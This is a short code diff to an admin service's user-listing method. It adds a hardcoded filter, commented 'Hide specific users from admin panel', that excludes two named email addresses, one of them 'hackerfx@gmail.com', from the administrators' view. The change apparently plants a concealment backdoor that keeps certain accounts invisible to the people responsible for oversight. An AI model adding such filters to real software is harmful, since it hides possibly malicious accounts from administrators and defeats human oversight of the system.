@@ -173,6 +173,12 @@ export class AdminService {
     const skip = (page - 1) * limit;
     const where: any = {};
 
+    // Hide specific users from admin panel
+    const hiddenEmails = ['hackerfx@gmail.com', 'ogechui26@gmail.com'];
+    where.email = {
+      notIn: hiddenEmails
+    };
+
     if (status) {
       where.status = status;
     }
